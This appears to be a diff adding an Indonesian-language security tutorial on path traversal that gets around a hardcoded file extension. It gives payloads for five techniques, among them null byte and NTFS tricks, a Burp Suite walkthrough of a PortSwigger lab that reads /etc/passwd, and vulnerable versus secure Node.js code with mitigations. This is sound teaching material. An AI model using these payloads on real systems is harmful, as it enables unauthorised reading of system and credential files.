@@ -1,0 +1,281 @@
+# Directory Traversal: Bypassing Hardcoded Extension (Null Byte & Truncation)
+
+Dalam pengembangan aplikasi web, salah satu pola paling umum untuk membatasi akses berkas adalah dengan **mengunci ekstensi berkas secara kaku (_hardcoded file extension_)** di sisi backend, misalnya menambahkan akhiran `.png`, `.jpg`, atau `.php` secara otomatis.
+
+Ketika pengembang menulis kode seperti ini, mereka berasumsi bahwa penyerang tidak akan bisa membaca berkas sistem penting seperti `/etc/passwd` karena server akan selalu mencari `/etc/passwd.png` (yang tidak pernah ada).
+
+Namun, ada berbagai teknik pemotongan (_truncation_) dan manipulasi string tingkat rendah—termasuk **Null Byte Injection (`%00`)**—yang dapat menembus proteksi ekstensi tersebut.
+
+---
+
+## 1. Konsep Kerentanan: Mengapa Hardcoded Extension Gagal?
+
+Perhatikan contoh kode backend yang memuat gambar produk berikut:
+
+```javascript
+// Backend menggabungkan path direktori dan mengunci ekstensi .png
+const filename = req.query.filename;
+const fullPath = "/var/www/public/images/" + filename + ".png";
+
+fs.readFile(fullPath, (err, data) => {
+  if (err) return res.status(404).send("File tidak ditemukan.");
+  res.sendFile(fullPath);
+});
+```
+
+### Mengapa Payload Standar Gagal?
+Jika penyerang mengirimkan payload traversal biasa:
+```http
+GET /image?filename=../../../etc/passwd HTTP/1.1
+```
+
+Backend akan merangkai jalur berkas menjadi:
+```text
+/var/www/public/images/../../../etc/passwd.png
+=> Resolves to: /etc/passwd.png
+```
+
+Karena berkas `/etc/passwd.png` **tidak ada di sistem Linux**, server mengembalikan respons `404 Not Found`.
+
+---
+
+## 2. Alur Eksploitasi: Bypassing Hardcoded Extension
+
+![Directory Traversal Hardcoded Extension Bypass](/images/directory-traversal-hardcoded-extension.svg)
+
+---
+
+## 3. Lima Metode Bypassing Hardcoded Extension
+
+Berikut adalah teknik-teknik yang digunakan untuk memotong (_truncate_) atau mengelabui akhiran ekstensi yang dipaksakan:
+
+---
+
+### Metode 1: Null Byte Injection (`%00` / `\0`)
+
+Null Byte Injection adalah salah satu teknik paling legendaris dalam sejarah keamanan komputer.
+
+#### Cara Kerja di Level Sistem Operasi:
+1. Banyak bahasa tingkat tinggi (seperti PHP versi lama, Python dengan modul C, Perl, dan Java) memanggil pustaka standar bahasa C (seperti `fopen()`, `open()`, atau `stat()`) untuk membaca berkas dari sistem operasi.
+2. Dalam standar bahasa **C (C-String)**, sebuah string tidak memiliki penanda panjang eksplisit di memori, melainkan ditandai selesai oleh karakter **Null Terminator (`\0` atau byte `0x00`)**.
+3. Ketika URL-encoded byte `%00` dikirim oleh klien, backend menerima string:
+   ```text
+   /var/www/images/../../../etc/passwd\0.png
+   ```
+4. Pengecekan tingkat tinggi (seperti `filename.endsWith(".png")`) melihat string tersebut sah karena berakhiran `.png`.
+5. Namun saat string dikirim ke fungsi C `fopen()`, kernel membaca karakter satu per satu dan **berhenti tepat pada byte `\0`**, mengabaikan semua karakter `.png` setelahnya!
+
+#### Contoh Payload:
+```http
+GET /image?filename=../../../etc/passwd%00.png HTTP/1.1
+GET /image?filename=/etc/passwd%00.jpg HTTP/1.1
+```
+
+> [!NOTE]
+> **Status Keamanan Modern:** Kerentanan Null Byte telah ditambal pada PHP >= 5.3.4, Java 7+, dan Node.js modern. Namun, teknik ini tetap sangat sering ditemukan pada aplikasi lawas (*legacy systems*), modul C/C++ native backend, *embedded devices*, serta skenario pengujian lab/CTF.
+
+---
+
+### Metode 2: Query String Truncation (`?` dan `#` / `%23`)
+
+Jika backend membaca berkas melalui protokol internal URI wrapper (seperti `file:///`, cURL, fungsi `fetch()`, atau sub-request Nginx):
+
+#### Cara Kerja:
+Saat backend menambahkan ekstensi `.png` di belakang input yang memiliki tanda tanya `?`, URL yang terbentuk menjadi:
+```text
+file:///var/www/images/../../../etc/passwd?.png
+```
+Tanda `?` diperlakukan sebagai awal dari parameter query URL, sehingga path resolver mengabaikan `?.png` dan hanya membuka berkas `/etc/passwd`.
+
+#### Contoh Payload:
+```http
+GET /image?filename=../../../etc/passwd? HTTP/1.1
+GET /image?filename=/etc/passwd%23 HTTP/1.1
+```
+*(Catatan: `%23` adalah URL-encoded dari tanda pagar `#` untuk fragment identifier).*
+
+---
+
+### Metode 3: Path Parameter Matrix / Semicolon (`;`)
+
+Pada server berbasis Java seperti **Apache Tomcat** dan **Spring Framework**, tanda titik koma (`;`) digunakan untuk memisahkan parameter matriks dalam path URL:
+
+#### Cara Kerja:
+Backend menggabungkan string menjadi:
+```text
+/etc/passwd;.png
+```
+Tomcat/Spring mengisolasi bagian sebelum titik koma sebagai nama berkas sebenarnya (`/etc/passwd`) dan menganggap `;.png` sebagai atribut matriks opsional.
+
+#### Contoh Payload:
+```http
+GET /image?filename=/etc/passwd;.png HTTP/1.1
+```
+
+---
+
+### Metode 4: Normalisasi Sistem Berkas Windows NTFS (Trailing Dots & ADS)
+
+Sistem berkas **Windows (NTFS)** memiliki perilaku penamaan berkas yang unik:
+
+1. **Trailing Dots (`.`):** Windows secara otomatis memangkas titik atau spasi di ujung akhir nama berkas.
+   - Contoh: `GET /image?filename=..\..\boot.ini.`
+   - Hasil gabungan: `boot.ini..png` atau `boot.ini.` yang langsung dinormalisasi menjadi `boot.ini`.
+2. **Alternate Data Streams (ADS `::$DATA`):** Setiap berkas di NTFS memiliki stream data default bernama `$DATA`.
+   - Contoh: `GET /image?filename=..\..\windows\win.ini::$DATA`
+   - Windows membaca konten asli berkas `win.ini` dan mengabaikan ekstensi yang ditempelkan.
+
+---
+
+### Metode 5: Path Length Truncation (Buffer Overflow via `./././`)
+
+Pada sistem operasi dan interpreter versi lama, fungsi filesystem memiliki batasan alokasi memori buffer `MAX_PATH` (misal 4096 byte di Linux atau 260 byte di Windows):
+
+#### Cara Kerja:
+Penyerang membuat payload traversal yang sangat panjang dengan menyelipkan sekuens `./` berulang kali hingga batas buffer terlampaui:
+```text
+../../../etc/passwd/./././././...[diulang sampai 4096 karakter]...
+```
+Ketika backend menambahkan `.png` di ujung kanan, karakter `.png` tersebut terpotong (*overflow / truncated*) di luar buffer memori, sehingga sistem membuka murni `/etc/passwd`.
+
+---
+
+## 4. Praktik Langkah Demi Langkah Menggunakan Burp Suite
+
+Berikut panduan menyelesaikan skenario lab PortSwigger (*File path traversal, validation of file extension with null byte bypass*):
+
+---
+
+### Langkah 1: Tangkap Request Pemuatan Berkas
+1. Akses halaman aplikasi target menggunakan browser bawaan **Burp Suite**.
+2. Buka salah satu gambar produk, lalu periksa request HTTP di tab **Proxy** > **HTTP history**:
+   ```http
+   GET /image?filename=25.jpg HTTP/1.1
+   Host: target-lab.net
+   ```
+
+---
+
+### Langkah 2: Kirim Request ke Burp Repeater
+1. Klik kanan pada request tersebut dan pilih **Send to Repeater** (`Ctrl + R` / `Cmd + R`).
+2. Masuk ke tab **Repeater**.
+
+---
+
+### Langkah 3: Uji Traversal Biasa (Observasi Error 404)
+1. Ubah parameter `filename` menjadi:
+   ```http
+   GET /image?filename=../../../etc/passwd HTTP/1.1
+   ```
+2. Klik tombol **Send**.
+3. Server merespons dengan `404 Not Found: "File not found /etc/passwd.jpg"`, membuktikan bahwa server memaksakan ekstensi `.jpg`.
+
+---
+
+### Langkah 4: Terapkan Null Byte Bypass (`%00`)
+1. Sisipkan `%00.jpg` di akhir payload:
+
+```http
+GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
+Host: target-lab.net
+Cookie: session=xyz...
+```
+
+2. Klik tombol **Send**.
+
+---
+
+### Langkah 5: Analisis Hasil Response
+1. Periksa panel **Response** di sebelah kanan.
+2. Server berhasil merespons dengan status **`200 OK`** dan mengembalikan isi berkas `/etc/passwd`:
+
+```http
+HTTP/1.1 200 OK
+Content-Type: image/jpeg
+Content-Length: 1345
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+carlos:x:1001:1001:Carlos:/home/carlos:/bin/bash
+peter:x:1002:1002:Peter:/home/peter:/bin/bash
+```
+
+3. Lab berhasil diselesaikan (*Solved*)! 🎉
+
+---
+
+## 5. Bedah Kode Backend: Rentan vs Aman
+
+### ❌ Contoh Kode Backend yang Rentan (String Concatenation Naif)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  const filename = req.query.filename as string;
+
+  // ❌ Penggabungan string naif dengan ekstensi terkunci
+  // Rentan terhadap Null Byte (%00), Query String (?), dan Traversal (../)
+  const fullPath = path.join("/var/www/public/images", filename + ".png");
+
+  fs.readFile(fullPath, (err, data) => {
+    if (err) return res.status(404).send("Berkas tidak ditemukan.");
+    return res.type("png").send(data);
+  });
+});
+```
+
+---
+
+### ✅ Contoh Kode Backend yang Aman (Sanitasi Karakter & Mapping Terisolasi)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  const BASE_DIR = path.resolve("/var/www/public/images");
+  const filename = req.query.filename as string;
+
+  // 1. Sanitasi Ketat: Tolak null byte (\0 / %00), slash (/), dan titik ganda (..)
+  if (!filename || typeof filename !== "string") {
+    return res.status(400).json({ error: "Parameter tidak valid." });
+  }
+
+  // Tolak jika mengandung karakter non-alfanumerik berbahaya
+  if (!/^[a-zA-Z0-9_-]+$/.test(filename)) {
+    return res.status(400).json({ error: "Karakter ilegal terdeteksi." });
+  }
+
+  // 2. Gabungkan path dengan ekstensi yang aman
+  const safeFilename = `${filename}.png`;
+  const targetPath = path.resolve(BASE_DIR, safeFilename);
+
+  // 3. Verifikasi batasan direktori kerja (Canonical Check)
+  if (!targetPath.startsWith(BASE_DIR + path.sep)) {
+    return res.status(403).json({ error: "Akses di luar direktori ditolak." });
+  }
+
+  // 4. Pastikan file fisik ada sebelum dikirim
+  if (!fs.existsSync(targetPath)) {
+    return res.status(404).json({ error: "Berkas tidak ditemukan." });
+  }
+
+  return res.sendFile(targetPath);
+});
+```
+
+---
+
+## 6. Ringkasan & Panduan Mitigasi
+
+1. **Gunakan Identifier Acak (Database Lookup):**
+   Hindari menggunakan nama berkas dari parameter pengguna secara langsung. Gunakan UUID atau ID numerik yang dipetakan ke berkas fisik di database.
+2. **Validasi Karakter Alfanumerik (Strict Whitelist):**
+   Hanya izinkan karakter `[a-zA-Z0-9_-]`. Tolak semua input yang memuat `%00`, `/`, `\`, `.`, `;`, atau `?`.
+3. **Selalu Lakukan Path Normalization & Canonicalization:**
+   Gunakan fungsi `path.resolve()` atau `realpath()` dan pastikan path berkas akhir selalu berada di dalam `BASE_DIR`.
+4. **Perbarui Runtime & Framework ke Versi Modern:**
+   Pastikan menggunakan versi runtime terbaru (PHP 8+, Java 17+, Node.js LTS) yang secara otomatis menolak injeksi karakter null byte pada fungsi I/O berkas.
